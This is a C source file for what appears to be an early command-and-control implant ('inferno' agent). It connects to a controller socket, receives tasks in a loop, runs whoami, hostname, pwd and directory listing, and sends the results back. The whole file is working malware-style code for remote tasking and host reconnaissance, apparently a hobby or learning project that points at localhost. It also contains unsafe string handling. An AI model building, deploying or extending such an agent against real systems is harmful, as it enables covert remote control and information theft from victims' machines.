#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define IP "127.0.0.1"
#define PORT_HTTP 80

//handle erros
void error(char *message) {
    fprintf(stderr, "%s: %s\n", message, strerror(errno));
    exit(EXIT_FAILURE);
}

//networked part
void networking();

//executing command
char *executing(char *receive, char *arg);

//whoami command
char *whoamiCommand();

//hostname command
char *hostnameCommand();

//pwd command
char *pwdCommand();

//ls command
char *lsCommand(char *path);

int main() {
    networking();
}

void networking() {
    //socket http
    printf("Initializing socket...\n");
    int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (inferno_socket == -1)
        error("Error initializing socket");

    //preparing http address
    struct sockaddr_in c2_address;
    memset(&c2_address, 0, sizeof(c2_address));
    c2_address.sin_family = AF_INET;
    c2_address.sin_port = htons(PORT_HTTP);
    c2_address.sin_addr.s_addr = inet_addr(IP);

    //connect http
    printf("Connecting...\n");
    if (connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address)) == -1)
        error("Error connecting");
    puts("Connected");
    
    while (1) {
    	//receiving http payload
    	char receive[2048];
    	if (recv(inferno_socket, receive, 2048, 0) == -1)
            error("Error receiving payload");
    	printf("Receiving:\n\n%s\n\n", receive);
        
        //copying original payload
        char receive_copy[2048];
        strcpy(receive_copy, receive);
  
        //parsing to extract payload
        char *content_length = strstr(receive_copy, "{'payload':");
        content_length += strlen("{'payload':");
        char *command_start = strtok(content_length, "'");
        char *command = strtok(command_start, "'");

        //copying original payload
        char receive_copy2[2048];
        strcpy(receive_copy2, receive);

        //parsing to extract argument
        char *content_length_arg = strstr(receive_copy2, ",'argument':");
        char *arg;
        if (content_length_arg != NULL) {
            content_length_arg += strlen(",'argument':");
            char *arg_start = strtok(content_length_arg, "'");
            arg = strtok(arg_start, "'");
        }

        //executing payload
        char response[2048];
        char *task;
        if (content_length_arg == NULL)
            task = executing(command, NULL);
        else
            task = executing(command, arg);    

        sprintf(response, "%s\r\n", task);
        printf("Executing: '%s'\n", command);

    	//sending payload result
    	printf("Sending: '%s' from agent...\n", response);
    	if (send(inferno_socket, response, sizeof(response), 0) == -1)
            error("Error sending payload result");
    	printf("Sent:\n\n'%s' from agent...\n", response);
    }
    if (close(inferno_socket) == -1)
        error("Error closing socket");
}

char *executing(char *receive, char *arg) {
    char *task;

    //execute whoami
    if (strcmp(receive, "whoami") == 0) {
        task = whoamiCommand();

    //execute hostname
    } else if (strcmp(receive, "hostname") == 0) {
        task = hostnameCommand();

    //execute pwd
    } else if (strcmp(receive, "pwd") == 0) {
        task = pwdCommand();
    
    // execute ls
    } else if (strcmp(receive, "ls") == 0) {
        task = lsCommand(arg);

    //payload not yet build
    }else {
        task = "NULL";
    } return task;
}

//whoami syscall
char *whoamiCommand() {
    char *username = getlogin();
    return username;
}

//hostname syscall
char *hostnameCommand() {
    static char hostname[2048];
    gethostname(hostname, 2048);
    return hostname;
}

//pwd syscall
char *pwdCommand() {
    static char directory[2048];
    getcwd(directory, 2048);
    return directory;
}

//ls syscall
char *lsCommand(char *path) {
    struct stat sb;
    char *error;
    if (path == NULL)
        path = ".";
    char *buf = malloc(2048 * sizeof(char));
    DIR *dirp = opendir(path);
    if (dirp == NULL) {
        error = "Cannot open directory";
        return error;
    }

    struct dirent *list;
    sprintf(buf, "Type\t\tSize\tName\n");
    sprintf(buf + strlen(buf), "====\t\t====\t====\n");
    while ((list = readdir(dirp)) != NULL) {
        char type[2048];
        char pathname[2048];
        sprintf(pathname, "%s/%s", path, list->d_name);
        lstat(pathname, &sb);
        switch (sb.st_mode & S_IFMT) {
           case S_IFBLK:  sprintf(type, "block device");            break;
           case S_IFCHR:  sprintf(type, "character device");        break;
           case S_IFDIR:  sprintf(type, "directory");               break;
           case S_IFIFO:  sprintf(type, "FIFO/pipe");               break;
           case S_IFLNK:  sprintf(type, "symlink");                 break;
           case S_IFREG:  sprintf(type, "regular file");            break;
           case S_IFSOCK: sprintf(type, "socket");                  break;
           default:       sprintf(type, "unknown?");                break;
        }
        sprintf(buf + strlen(buf), "%s\t%d\t%s\t\n", type, list->d_reclen, list->d_name);
    }
    return buf;
}
